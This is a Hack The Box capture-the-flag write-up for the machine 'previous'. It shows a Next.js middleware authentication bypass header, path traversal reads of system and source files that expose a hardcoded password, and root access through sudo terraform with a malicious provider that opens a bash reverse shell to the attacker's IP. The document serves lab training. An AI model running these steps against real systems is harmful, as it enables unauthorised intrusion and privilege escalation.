we start with a port scan

```bash
# Nmap 7.95 scan initiated Sun Dec 28 07:19:22 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -vv -oa 10.10.11.83 nmap_scan.txt
Failed to resolve "nmap_scan.txt".
Failed to resolve "nmap_scan.txt".
Nmap scan report for 10.10.11.83
Host is up, received echo-reply ttl 63 (0.12s latency).
Scanned at 2025-12-28 07:19:23 EST for 11s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Failed to resolve "nmap_scan.txt".
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 28 07:19:34 2025 -- 1 IP address (1 host up) scanned in 12.17 seconds
```

Ok so we got ssh and a website.
The website is using PreviousJs lets see if there are some exploits for it. I tried scanning directories and subdomains and i found nothing.

Next.js authentication bypass vulnerability (CVE-2025-29927)

This seems like its right up our alley.

Im going to read what the exploit is about and see if there is a proof of concept for it or something like that.


https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass

Ok so it was pretty simple. We just used "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" header in burpsuite to bypass the authentication and we were able to login and get access to the site after the login screen.

Ok so now we are able to read stuff that we shouldn't be authenticated to do. I did a dirsearch scan to see what stuff I could read to get more informationn out. 

```bash
[12:11:41] Starting: api/
[12:11:42] 308 -   22B  - /api/%2e%2e//google.com  ->  /api/%2E%2E/google.com
[12:12:15] 400 -   64B  - /api/auth/admin                                   
[12:12:15] 400 -   64B  - /api/auth/adm
[12:12:15] 400 -   64B  - /api/auth/login                                   
[12:12:15] 400 -   64B  - /api/auth/login.php                               
[12:12:15] 400 -   64B  - /api/auth/login.aspx                              
[12:12:15] 400 -   64B  - /api/auth/login.jsp                               
[12:12:15] 400 -   64B  - /api/auth/login.html                              
[12:12:15] 400 -   64B  - /api/auth/login.js
[12:12:15] 400 -   64B  - /api/auth/logon
[12:12:15] 302 -    0B  - /api/auth/signin  ->  /signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000
[12:12:15] 308 -   34B  - /api/axis2//axis2-web/HappyAxis.jsp  ->  /api/axis2/axis2-web/HappyAxis.jsp
[12:12:15] 308 -   28B  - /api/axis2-web//HappyAxis.jsp  ->  /api/axis2-web/HappyAxis.jsp
[12:12:15] 308 -   23B  - /api/axis//happyaxis.jsp  ->  /api/axis/happyaxis.jsp
[12:12:19] 308 -   56B  - /api/Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /api/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[12:12:25] 400 -   28B  - /api/download                                     
[12:12:26] 308 -   43B  - /api/engine/classes/swfupload//swfupload.swf  ->  /api/engine/classes/swfupload/swfupload.swf
[12:12:26] 308 -   46B  - /api/engine/classes/swfupload//swfupload_f9.swf  ->  /api/engine/classes/swfupload/swfupload_f9.swf
[12:12:28] 308 -   31B  - /api/extjs/resources//charts.swf  ->  /api/extjs/resources/charts.swf
[12:12:32] 308 -   41B  - /api/html/js/misc/swfupload//swfupload.swf  ->  /api/html/js/misc/swfupload/swfupload.swf
```

```bash
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" http://previous.htb/api/download
invalid filename
```

Ok so lets use fuzz the parameters..

```bash
ffuf -u 'http://previous.htb/api/download?FUZZ=a' -w fuzzDicts/paramDict/AllParam.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fs 28

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=a
 :: Wordlist         : FUZZ: /home/kali/htb/previous/fuzzDicts/paramDict/AllParam.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 28
________________________________________________

example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 356ms]
```
It's just a basic ffuf command but match all possible status codes and just filter out the size of 26. 

Ok so the parameter is example now we just need to see if there are some possible files.I ran another ffuf scan with LFI (local file inclusion) and we got multiple hits so we know that we can explore this.


```bash
curl 'http://previous.htb/api/download?example=../../../../etc/passwd' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

```bash
curl 'http://previous.htb/api/download?example=../../../../proc/self/environ' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' --output -

NODE_VERSION=18.20.8
HOSTNAME=0.0.0.0
YARN_VERSION=1.22.22
SHLVL=1PORT=3000
HOME=/home/nextjs
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NEXT_TELEMETRY_DISABLED=1
PWD=/app
NODE_ENV=production  
```

Ok we can tell that our directory is /app and that helps with our traversal

I need to find a way to figure out the nextjs file layout since i cant just blindly quess them.

https://nextjs.org/docs/app/getting-started/project-structure
https://dev.to/md-afsar-mahmud/folder-structure-for-a-nextjs-project-22fh

These sites helped me alot when trying to find some useful stuff while travelsing.

```bash
curl 'http://previous.htb/api/download?example=../../../../../../../app/.next/routes-manifest.json' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'                                                
{                                                                                                                                                                                                                                           
  "version": 3,                                                                                                                                                                                                                             
  "pages404": true,                                                                                                                                                                                                                         
  "caseSensitive": false,                                                                                                                                                                                                                   
  "basePath": "",                                                                                                                                                                                                                           
  "redirects": [                                                                                                                                                                                                                            
    {                                                                                                                                                                                                                                       
      "source": "/:path+/",                                                                                                                                                                                                                 
      "destination": "/:path+",                                                                                                                                                                                                             
      "internal": true,                                                                                                                                                                                                                     
      "statusCode": 308,                                                                                                                                                                                                                    
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"                                                                                                                                                                                       
    }                                                                                                                                                                                                                                       
  ],                                                                                                                                                                                                                                        
  "headers": [],                                                                                                                                                                                                                            
  "dynamicRoutes": [                                                                                                                                                                                                                        
    {                                                                                                                                                                                                                                       
      "page": "/api/auth/[...nextauth]",                                                                                                                                                                                                    
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
```

Lets check the auth.json folder



```bash
curl 'http://previous.htb/api/download?example=../../../../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})(); 
```
I had a bit trouble but I just had to URL encode the braces and it worked. We can see that there are credentials here

```bash
username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes"
```
Let's try if these credentials work on the ssh port we found

```bash
jeremy@previous:~$ id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
```

```bash
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
(root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Ok so we can run terraform as sudo so let's check if there are some knwon vulnerabilities or such on it.
https://toshith29.medium.com/proof-of-concept-terraform-privilege-escalation-cd3db69df90e

I found this. sadly its a writeup which was made after the box was released so it's kinda of cheating. But i think its important to finish the box and try to learn as much as possible anyways.

Terraform is infrastucture as code tool. Its used to manage infrastructure such as servers, databses and networks using code instead of doing it mnaually.

We are only allowed to run it using privileges from a specific folder which is /opt/examples

```bash
jeremy@previous:/opt/examples$ cat main.tf 
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```
In this we can see that the source path was from /root/examples

I created this exploit

```bash
package main

import (
    "os"
    "os/exec"
)

func main() {
cmd := exec.Command("bash", "-c", "bash -i >& /dev/tcp/10.10.14.126/9001 0>&1")
cmd.Stdin = os.Stdin
cmd.Stdout = os.Stdout
cmd.Stderr = os.Stderr
cmd.Run()
}
```
Then I compiled it into binary and transfered it over with wget

We then moved it to the folder /tmp/provider and created a new config file in to the /tmp folder.

```bash
cat > /tmp/tmp.rc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp/provider"
  }
  direct {}
}
EOF
```
This config files pretty much makes the terraform run our maliscious /tmp/provider script instead of the intended one. 


And since terraform uses the enviroment variables and priorizes them we can change the path of it to the previos config file

```bash
export TF_CLI_CONFIG_FILE=/tmp/tmp.rc
```

sudo /usr/bin/terraform -chdir\=/opt/examples apply

Then we just run terraform as sudo and setup netcat on port 9001.

```bash
listening on [any] 9001 ...
connect to [10.10.14.126] from (UNKNOWN) [10.10.11.83] 57860
root@previous:/opt/examples# whoami
whoami
root
root@previous:/opt/examples# cat /root/root.txt
cat /root/root.txt
591a1e73ea8cbc83760c57a9f26fa18f
```



